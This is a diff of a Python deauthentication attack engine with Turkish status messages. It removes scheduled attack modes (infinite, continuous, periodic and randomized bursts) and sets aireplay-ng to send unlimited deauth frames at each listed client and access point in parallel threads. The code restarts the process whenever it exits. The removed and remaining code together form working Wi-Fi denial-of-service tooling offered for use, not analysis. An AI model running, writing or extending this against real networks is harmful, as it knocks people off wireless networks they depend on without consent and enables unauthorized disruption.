@@ -34,18 +34,12 @@ class AttackTarget:
 class DeauthEngine:
     """Multi-target deauthentication attack engine"""
     
-    def __init__(self, interface: str, attack_mode: Optional[dict] = None):
+    def __init__(self, interface: str):
         self.interface = interface
         self.targets: Dict[str, AttackTarget] = {}
         self.attack_threads: List[threading.Thread] = []
         self.is_attacking = False
         self.lock = threading.Lock()
-        self.attack_mode = attack_mode or {
-            'type': 'infinite',
-            'duration': float('inf'),
-            'interval': 0
-        }
-        self.attack_start_time = None
         
     def add_target(self, client_mac: str, ap_bssid: str, ap_essid: str = "Unknown"):
         """Add a target to attack list"""
@@ -86,20 +80,19 @@ class DeauthEngine:
             return
         
         self.is_attacking = True
-        self.attack_start_time = time.time()
-        
-        mode_type = self.attack_mode.get('type', 'infinite')
-        logger.info(f"Starting attack on {len(self.targets)} targets with mode: {mode_type}")
+        logger.info(f"Starting attack on {len(self.targets)} targets")
         console.print(f"[green]🎯 Saldırı başlatılıyor... ({len(self.targets)} hedef)[/green]")
-        console.print(f"[cyan]📋 Mod: {mode_type.upper()}[/cyan]")
         
-        # Start mode controller thread
-        mode_thread = threading.Thread(
-            target=self._attack_mode_controller,
-            daemon=True
-        )
-        mode_thread.start()
-        self.attack_threads.append(mode_thread)
+        # Start attack thread for each target
+        for target in self.targets.values():
+            thread = threading.Thread(
+                target=self._attack_target,
+                args=(target,),
+                daemon=True
+            )
+            thread.start()
+            self.attack_threads.append(thread)
+            time.sleep(0.1)  # Stagger thread starts
     
     def stop_attack(self):
         """Stop all attacks"""
@@ -132,208 +125,6 @@ class DeauthEngine:
         self.attack_threads.clear()
         console.print("[green]✓ Saldırı durduruldu[/green]")
     
-    def _attack_mode_controller(self):
-        """Control attack based on selected mode"""
-        import random
-        
-        mode_type = self.attack_mode.get('type', 'infinite')
-        logger.info(f"Attack mode controller started: {mode_type}")
-        
-        if mode_type == 'infinite':
-            # Sonsuz mod - SALDIRI BAŞLAT VE SÜREKLI DEVAM ET!
-            logger.info("Infinite mode: starting continuous attack until manually stopped")
-            console.print(f"[red]🔴 SONSUZ MOD: Sürekli saldırı başlatılıyor...[/red]")
-            
-            # TÜM HEDEFLERE SALDIRI BAŞLAT!
-            for target in self.targets.values():
-                thread = threading.Thread(
-                    target=self._attack_target,
-                    args=(target,),
-                    daemon=True
-                )
-                thread.start()
-                self.attack_threads.append(thread)
-                time.sleep(0.1)
-            
-            console.print(f"[red]⚡ {len(self.targets)} hedefe sürekli saldırı aktif![/red]")
-            
-            # Sonsuz döngü - manuel durdurulana kadar
-            while self.is_attacking:
-                time.sleep(1)
-        
-        elif mode_type == 'continuous':
-            # Sürekli mod - belirli süre boyunca SÜREKLI SALDIRI
-            duration = self.attack_mode.get('duration', 300)
-            logger.info(f"Continuous mode: attacking for {duration} seconds")
-            console.print(f"[yellow]🟡 SÜREKLI MOD: {duration} saniye ({duration//60} dakika) sürekli saldırı![/yellow]")
-            
-            # TÜM HEDEFLERE SÜREKLI SALDIRI BAŞLAT!
-            for target in self.targets.values():
-                thread = threading.Thread(
-                    target=self._attack_target_timed,
-                    args=(target, duration),
-                    daemon=True
-                )
-                thread.start()
-                self.attack_threads.append(thread)
-                time.sleep(0.1)
-            
-            console.print(f"[yellow]⚡ {len(self.targets)} hedefe {duration}s sürekli saldırı başladı![/yellow]")
-            
-            # Wait for duration
-            time.sleep(duration)
-            
-            # Stop attack
-            logger.info("Continuous mode duration reached, stopping attack")
-            console.print(f"[green]✓ Sürekli mod tamamlandı ({duration}s)[/green]")
-            self.stop_attack()
-        
-        elif mode_type == 'periodic':
-            # Periyodik mod - belirli aralıklarla saldır
-            interval = self.attack_mode.get('interval', 600)
-            duration = self.attack_mode.get('duration', 30)
-            
-            logger.info(f"Periodic mode: attack {duration}s every {interval}s")
-            
-            while self.is_attacking:
-                # Start attack
-                console.print(f"[yellow]⚡ Saldırı başlatılıyor ({duration} saniye)...[/yellow]")
-                logger.info(f"Starting periodic attack burst")
-                
-                attack_threads = []
-                for target in self.targets.values():
-                    thread = threading.Thread(
-                        target=self._attack_target_timed,
-                        args=(target, duration),
-                        daemon=True
-                    )
-                    thread.start()
-                    attack_threads.append(thread)
-                    time.sleep(0.1)
-                
-                # Wait for attack duration
-                time.sleep(duration)
-                
-                # Stop this burst
-                for thread in attack_threads:
-                    thread.join(timeout=2)
-                
-                console.print(f"[green]✓ Saldırı burst tamamlandı[/green]")
-                
-                # Wait for next interval
-                console.print(f"[cyan]💤 Bekleniyor ({interval} saniye)...[/cyan]")
-                logger.info(f"Waiting {interval}s until next burst")
-                
-                for i in range(interval):
-                    if not self.is_attacking:
-                        break
-                    time.sleep(1)
-        
-        elif mode_type == 'random':
-            # Rastgele mod - düzensiz aralıklarla saldır
-            total_duration = self.attack_mode.get('duration', 600)
-            min_interval = self.attack_mode.get('min_interval', 30)
-            max_interval = self.attack_mode.get('max_interval', 180)
-            min_attack = self.attack_mode.get('min_attack', 10)
-            max_attack = self.attack_mode.get('max_attack', 60)
-            
-            logger.info(f"Random mode: total {total_duration}s, intervals {min_interval}-{max_interval}s, attacks {min_attack}-{max_attack}s")
-            
-            start_time = time.time()
-            
-            while self.is_attacking and (time.time() - start_time) < total_duration:
-                # Random wait
-                wait_time = random.randint(min_interval, max_interval)
-                console.print(f"[cyan]💤 Rastgele bekleme: {wait_time} saniye...[/cyan]")
-                logger.info(f"Random wait: {wait_time}s")
-                
-                for i in range(wait_time):
-                    if not self.is_attacking:
-                        break
-                    time.sleep(1)
-                
-                if not self.is_attacking:
-                    break
-                
-                # Random attack duration
-                attack_duration = random.randint(min_attack, max_attack)
-                console.print(f"[yellow]⚡ Rastgele saldırı: {attack_duration} saniye![/yellow]")
-                logger.info(f"Random attack burst: {attack_duration}s")
-                
-                attack_threads = []
-                for target in self.targets.values():
-                    thread = threading.Thread(
-                        target=self._attack_target_timed,
-                        args=(target, attack_duration),
-                        daemon=True
-                    )
-                    thread.start()
-                    attack_threads.append(thread)
-                    time.sleep(0.1)
-                
-                # Wait for attack duration
-                time.sleep(attack_duration)
-                
-                # Stop this burst
-                for thread in attack_threads:
-                    thread.join(timeout=2)
-                
-                console.print(f"[green]✓ Rastgele saldırı burst tamamlandı[/green]")
-            
-            logger.info("Random mode total duration reached, stopping attack")
-            self.stop_attack()
-    
-    def _attack_target_timed(self, target: AttackTarget, duration: int):
-        """Attack a target for a specific duration"""
-        try:
-            target.start_time = datetime.now()
-            logger.info(f"Starting timed attack on {target.client_mac} for {duration}s")
-            
-            cmd = [
-                'aireplay-ng',
-                '--deauth', '0',  # Continuous for this duration
-                '-a', target.ap_bssid,
-                '-c', target.client_mac,
-                self.interface
-            ]
-            
-            logger.info(f"Timed deauth command: {' '.join(cmd)}")
-            
-            target.process = subprocess.Popen(
-                cmd,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-            
-            # Wait for duration
-            start = time.time()
-            while (time.time() - start) < duration and self.is_attacking:
-                if target.process.poll() is not None:
-                    # Process died, restart
-                    target.process = subprocess.Popen(
-                        cmd,
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL
-                    )
-                time.sleep(0.5)
-            
-            # Stop process
-            if target.process:
-                try:
-                    target.process.terminate()
-                    target.process.wait(timeout=2)
-                except Exception:
-                    try:
-                        target.process.kill()
-                    except Exception:
-                        pass
-                target.process = None
-            
-            logger.info(f"Timed attack completed for {target.client_mac}")
-            
-        except Exception as e:
-            logger.error(f"Timed attack error for {target.client_mac}: {e}")
-    
     def _attack_target(self, target: AttackTarget):
         """Attack a single target (runs in separate thread)"""
         try:
@@ -343,7 +134,7 @@ class DeauthEngine:
             # Build aireplay-ng command - DİNAMİK INTERFACE
             cmd = [
                 'aireplay-ng',
-                '--deauth', '1000',  # 1000 paket (0 yerine sayı kullan)
+                '--deauth', '0',  # 0 = SINIRSIZ (kapatılana kadar devam eder)
                 '-a', target.ap_bssid,  # AP BSSID
                 '-c', target.client_mac,  # Client MAC
                 self.interface  # Dinamik interface (wlan0mon, wlan0, vb.)
